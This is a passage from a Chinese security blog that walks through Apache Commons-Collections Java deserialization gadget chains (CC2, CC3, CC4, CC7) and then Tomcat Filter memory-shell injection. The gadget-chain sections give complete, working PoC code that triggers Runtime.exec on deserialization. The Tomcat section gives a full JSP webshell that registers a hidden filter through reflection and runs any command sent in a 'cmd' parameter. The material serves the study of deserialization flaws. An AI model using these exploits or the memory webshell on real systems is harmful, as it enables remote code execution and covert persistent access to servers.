这里我们让我们的恶意类继承AbstractTranslet即可\n最后调用_class[_transletIndex].newInstance();触发命令执行\n这里让我想起个东西forName\npublic static Class\u0026lt;?\u0026gt; forName(String name, boolean initialize, ClassLoader loader); initialize 默认为 true, 即进行类初始化 (加载 static 类型的属性, 并且执行 static {} 块中的代码) 在上面loader.defineClass加载时并没有调用我static中代码，看了forName的代码后面是底层C代码了，感兴趣的可以研究下。然后附上最后的poc吧。\n还有一点要提醒，因为是改编CC1的链子，所以jdk版本不能高了\nimport com.sun.javafx.beans.IDProperty; import com.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); //setFiled(templates,\u0026#34;_auxClasses\u0026#34;,new Hashtable()); InstantiateTransformer invokerTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); ConstantTransformer constantTransformer = new ConstantTransformer(TrAXFilter.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer}; Transformer keyTransformer = new ChainedTransformer(transformers); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); HashMap hashmap = new HashMap(); hashmap.put(\u0026#34;value\u0026#34;,1111); LazyMap lazymap = (LazyMap) LazyMap.decorate(hashmap, keyTransformer); InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(IDProperty.class, lazymap); Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object obj = declaredConstructor.newInstance(IDProperty.class, map); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(obj); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void setFiled(TemplatesImpl templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } Evil.class\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } CommonsCollections7 cc7 利用的是 hash 碰撞来触发 Hashtable 的 equals 方法, 进而调用 LazyMap get\n这里注意是java.util.Hashtable别和CC3那个搞混了\nPayload method chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.LazyMap.equals org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform 我们看到Hashtable.reconstitutionPut，根据利用链我们是要控制e.key这个值\n问题7 e.key 不难看到e.key在readobject代码中是没地方赋值的，但是我们可以看到执行完for后对tab进行了赋值，但是已经过了for又有什么意义呢，我们跳到readobject代码中可以到reconstitutionPut方法外面也有一层for，这就有意思了，我们让第一次for时赋值，第二次for调用上次赋值不久行了嘛，还有个相关参数elements这个参数是Hashtable有几对的计数。\n解决：\n在put个值\nHashtable hashtable = new Hashtable(); hashtable.put(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;); hashtable.put(\u0026#34;2A\u0026#34;, \u0026#34;2B\u0026#34;); 可以发现这里e.key是我们上一次的key\n问题8 hash\u0026amp;index Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, tmp); lazyMap1.put(\u0026#34;yy\u0026#34;, \u0026#34;yy\u0026#34;); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zz\u0026#34;, \u0026#34;zz\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \u0026#34;B\u0026#34;); hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); 这里有几个点需要注意，e.key我们要利用最后肯定是lazymap，这里key是lazymap，值是lazyMap.put设置的\nhashCode()计算 这里一次i.next().hashCode()的值会进行key和value的hash值进行异或返回，然后把每对hash计算的结果加起来的总值返回（这里后面有用）\nindex 这里index是hash和其他值计算的结果，但是我们要让这个index可控，因为第二次进入这个循环时e是去获取tab对应的index，要想得到上一次赋值的值，第二次进入reconstitutionPut时，index要和上一次相同，不然e就没有值\n解决：\n这里我们最好想到的一个值且好控制那肯定是0啊（因为异或所以也会联想到这个），hash为0及index也为0，这里我们上面分析过hashCode\n所以Lazymap#put时，key和value设置成一样的就行了\n问题9 hash 通过上面的处理，我们原以为可以打通链子了，但是实际上还是不行。我们发现第二次的hash并不为0\n尽管这里index弄巧成拙是0，但是这次的hash还是会和上一次的hash进行校对要一样才会进行equals\n其实，第二次的key中多了一个next，而hash正是因为第二对yy和1的hash值产生的偏差\n这对值怎么来的呢 在第二次hashtable.put时会触发链子，\n在hashtable.put中我们会看到和reconstitutionPut()几乎一样的逻辑\n但是这里我们还是要保持hash值一样，不然后面还是利用不了\n继续跟进，这里执行完后，没有报错所以不影响，之类会给第二个map，put第一个map的key和执行的结果1\n这就是问题所在\n*问题9 3解决 解决一 既然是map.put的问题，能让其不执行到这步就可以了呀\n这里将lazyMap2.put(\u0026quot;zz\u0026quot;, \u0026quot;zz\u0026quot;);调整顺序放到下面\n在到java.util.AbstractMap.equals时，由于这里是第二个hashtable.put触发，m.size由于还没有put值，所以这里是0，而size()是计算上一个lazyMap1.put，值为1，这里就会return结束，从而也不会调用map.put。\n完美解决了这个问题，而且序列化时也不会触发链子\n解决二 添加一行lazyMap2.remove(\u0026quot;yy\u0026quot;);,既然是值的问题，我们把这个值删除了不就行了，这样hash就都是0了，序列化时会触发链子但是不影响反序列化\nMap lazyMap1 = LazyMap.decorate(innerMap1, tmp); lazyMap1.put(\u0026#34;yy\u0026#34;, \u0026#34;yy\u0026#34;); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zz\u0026#34;, \u0026#34;zz\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \u0026#34;B\u0026#34;); hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); lazyMap2.remove(\u0026#34;yy\u0026#34;); *解决三 NO? 这里我们是要hash为0嘛，因为添加了个(yy,1)，我们分析知道这个value:1是固定，然后hash为0，感觉到了么，我们第1个put(1,1),后面添加的不就是(1,1)么,这对值的hash不也是0么\nMap lazyMap1 = LazyMap.decorate(innerMap1, tmp); lazyMap1.put(1, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zz\u0026#34;, \u0026#34;zz\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \u0026#34;B\u0026#34;); hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); 结果是冷酷的，在equals中，到AbstractMap#equals，我们可以看看两个value值不相等才会返回false外面这个value是第一个lazyMap1.put的value，如果是上述代码的话这里就是1（这里截的是值为2的图），然后m.get返回的值又是1，这里就返回true\n返回true的话，就会进入if，然后这里Hashtable也不会执行addEntry()添加值了，这里只会修改掉之前对应的value，这里将B修改成2B\nhashtable.put(lazyMap1, \u0026#34;B\u0026#34;); hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); 所以这里put用1是不行了，就这样结束了么？NO，竟然归根是addEntry()在添加，我们直接用这个方法添加不就行了，还绕过put()这层，反而跟解决一的思路一样了\nMap lazyMap1 = LazyMap.decorate(innerMap1, tmp); lazyMap1.put(1, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zz\u0026#34;, \u0026#34;zz\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \u0026#34;B\u0026#34;); //hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); //lazyMap2.remove(2); Method addEntry = hashtable.getClass().getDeclaredMethod(\u0026#34;addEntry\u0026#34;, int.class, Object.class, Object.class, int.class); addEntry.setAccessible(true); addEntry.invoke(hashtable, 0, lazyMap2, \u0026#34;2B\u0026#34;, 0); poc import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.AbstractMapDecorator; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Method; import java.util.AbstractMap; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC7_test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getDeclaredMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); Transformer tmp = new ConstantTransformer(1); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map innerMap3 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, tmp); lazyMap1.put(1, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zz\u0026#34;, \u0026#34;zz\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, \u0026#34;B\u0026#34;); //hashtable.put(lazyMap2, \u0026#34;2B\u0026#34;); //lazyMap2.remove(2); Method addEntry = hashtable.getClass().getDeclaredMethod(\u0026#34;addEntry\u0026#34;, int.class, Object.class, Object.class, int.class); addEntry.setAccessible(true); addEntry.invoke(hashtable, 0, lazyMap2, \u0026#34;2B\u0026#34;, 0); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(hashtable); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 存档2 改编CC7 Gadget chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() ChainedTransformer.transform() 前面我们CC6不是也用了hashCode么，这里我们结合一下\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; public class CC7_2 { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); LazyMap fistrmap = (LazyMap) LazyMap.decorate(new HashMap(),keyTransformer); fistrmap.put(\u0026#34;fistrmap\u0026#34;,1111); TiedMapEntry tiedMapEntry = new TiedMapEntry(fistrmap,\u0026#34;fistrmap\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tiedMapEntry, \u0026#34;B\u0026#34;); Field key = tiedMapEntry.getClass().getDeclaredField(\u0026#34;key\u0026#34;); key.setAccessible(true); key.set(tiedMapEntry,\u0026#34;kkkey\u0026#34;); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(hashtable); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } CommonsCollections2 0x02 环境 使用的是commons-collections-4.0版本，而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本，且4版本过高也不行，InvokerTransformer会改为不实现Serializable接口，比如4.4版本\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 利用链\n/* Gadget chain: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() 这里要size大于等于2才能进入for，poc设置下，其他跟着链子走就行了\nimport org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getDeclaredMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc.exe\u0026#34;}), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(transformerChain); PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator); Field size = priorityQueue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } CommonsCollections4 cc4 就是将 cc2 的 InvokerTransformer 替换成了 InstantiateTransformer, 然后利用 TemplatesImpl 来执行字节码\n上面CC2不是说了InvokerTransformer用不了嘛，4.4InstantiateTransformer也用不了hh尴尬，估计是解决4.0到4.4某个版本用不了InvokerTransformer创造的链子\n就是CC2的开头+CC3结尾，没啥好说的。\n/* Gadget chain: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC4 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); TemplatesImpl templates=new TemplatesImpl(); CC3.setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); CC3.setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); //setFiled(templates,\u0026#34;_auxClasses\u0026#34;,new Hashtable()); InstantiateTransformer invokerTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); ConstantTransformer constantTransformer = new ConstantTransformer(TrAXFilter.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer}; Transformer keyTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(keyTransformer); PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator); Field size = priorityQueue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 到这里常规的CC链就完结了\n0x03 存档挖掘 尝试挖掘，一开始是想看找commons-collections4.4依赖的链子的，查看发现（同时继承Serializable）可以用的并不多。\nClosureTransformer public T transform(final T input) { iClosure.execute(input); return input; } ConstantTransformer public O transform(final I input) { return iConstant; } FactoryTransformer public O transform(final I input) { return iFactory.create(); } IfTransformer public O transform(final I input) { if(iPredicate.evaluate(input)){ return iTrueTransformer.transform(input); } return iFalseTransformer.transform(input); } mapTransformer public O transform(final I input) { return iMap.get(input); } 进行有些搜索，看到evaluate方法，可以执行JEXL表达式\n很遗憾org.apache.commons.jexl3.internal.Script没有继承Serializable\nString Exp = \u0026#34;233.class.forName(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;; JexlEngine engine = new JexlBuilder().create(); JexlExpression Expression = engine.createExpression(Exp); JexlContext Context = new MapContext(); Object rs = Expression.evaluate(Context); 目前CC链先到这里吧，然后其他的一些CC链绕过或者构造可以参考下这个SerialKiller绕过，不过基本都是替换中间gadget，没有源头和结尾的利用\n参考：\nhttps://w0s1np.github.io/blog/commonscollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93.html\nSerialKiller绕过\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/","summary":"前言：主要是记录自己根据利用链，然后编写poc及遇到的问题和解决，然后组合一条链子（没啥意义当练手 0x01 环境 \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/junit/junit --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.11\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;","title":"Commons-Collections1-7"},{"content":"hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh\n环境 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 先贴poc吧，想看着写流程\n0x01 poc \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.security.auth.message.callback.SecretKeyCallback\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Response\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContextFacade\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.servlet.annotation.WebFilter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Context\u0026#34; %\u0026gt; \u0026lt;% //反射得到StandardContext ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext(); Field con = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); con.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext); Field context = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context.setAccessible(true); StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext); @WebFilter(filterName = \u0026#34;MyFilter\u0026#34;, urlPatterns = \u0026#34;/*\u0026#34;) class myFilter implements Filter{ @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { try { String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); // 设置响应头，确保客户端能正确接收文本数据 response.setContentType(\u0026#34;text/plain\u0026#34;); response.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); // 获取输出流，用于向客户端发送数据 PrintWriter writer = response.getWriter(); String line; while ((line = reader.readLine())!= null) { writer.write(line + \u0026#34;\\n\u0026#34;); } // 关闭相关资源 reader.close(); inputStream.close(); writer.close(); chain.doFilter(request, response); } catch (Exception e) { throw new RuntimeException(e); } } }; FilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\u0026#34;myFilter\u0026#34;); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\u0026#34;myFilter\u0026#34;); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); Field filterConfigs = Standardcontext1.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); filterConfigs.setAccessible(true); Map map = (Map) filterConfigs.get(Standardcontext1); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor.setAccessible(true); ApplicationFilterConfig myconfig = (ApplicationFilterConfig) declaredConstructor.newInstance(Standardcontext1, filterDef); map.put(\u0026#34;myFilter\u0026#34;, myconfig); out.println(1111111); %\u0026gt; 0x02 分析流程 先通过这个demo，调试分析，看什么地方调试我们的doFilter\npackage com.example.learnservlet; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \u0026#34;TestFilter\u0026#34;, urlPatterns = \u0026#34;/test/*\u0026#34;) public class TestFilter implements Filter { @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\u0026#34;filter\u0026#34;); chain.doFilter(request, response); } } 和listener一样的思路的话，这里我们就是要添加恶意filter到filters里\n然后我们找到addFilter，通过栈，我们发现每次请求ApplicationFilterFactory都会调用ApplicationFilterChain.addFilter()方法\n这里我们往上查看\nfilterMaps实际来自StandardContext，查看findFilterMaps方法，发现filterMaps\n然后我们看到addFilterMap方法，这里就想到我们获得StandardContext实例后调用这个方法插入filter，不久行了嘛\n但这里我们查看filterMaps并没有我们的Filter类属性，我们该怎么传入我们的Filter实例呢\n然后看调用栈往上看到在调用addFilterMap方法前会先调用addFilterDef方法\n这里去FilterDef去查找一番，发现有设置Filter，那么这个地方多半是传入Filter的地方了\n但是最后调用的filterMaps和FilterDef有什么关系呢，其实filter更像存储Filter基本信息（Filter名字，url）等，而FilterDef则储存Filter名字对应的Filter实例\nfilterDefs.put(filterDef.getFilterName(), filterDef); 这里put，第一个参数就是Filter名字。\n然后通过其他demoFilter的我们大概也知道filterMaps要设置什么值（Filter名字，url）\n然后尝试构造poc，最后写入filter代码长这样\nFilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\u0026#34;myFilter\u0026#34;); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\u0026#34;myFilter\u0026#34;); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); 运行后，执行发现没反应，调试发现漏了一处地方\n这里我的filterMaps已经有我自己的filterMap了，但是执行我的filterMap时进入了最后这个continue\n发现filterConfig没有值，起初没细看这里，以为这里是用来封装的，到filterMap构造就能成功执行。\n倒回来我们跟进findFilterConfig方法，然后再查看filterConfigs哪些地方调用过\n查看完，发现也只有**filterStart()**方法这里进行过赋值\n看到这，思路也清晰了，就是反射获取filterConfigs再put一个ApplicationFilterConfig，查看自构方法参数，然后不是public，这个构造方法也要通过反射然后实例化\nFilter传参带有response，不用考虑获取，servletContext和Listener一样的获取方式，然后就可以完整poc啦\nFilter 的加载流程如下\n通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain 调用 StandardContext.findFilterMaps() 得到 filterMaps 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName() 获取对应的 filterConfig, 并将其放入 FilterChain 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法 感觉自己第一次写，有些潦草，也不想大改了（懒）\n0x03 补充 这里补充下流程，直接借用其他大佬的图了\n调用栈\n直接跳转到 StandardWrapperValve 执行了 filterChain.doFilter 方法, 继续跟进\n然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的\n这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain\n需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫\n跟进 createFilterChain 方法\n首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内\n然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps\n最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 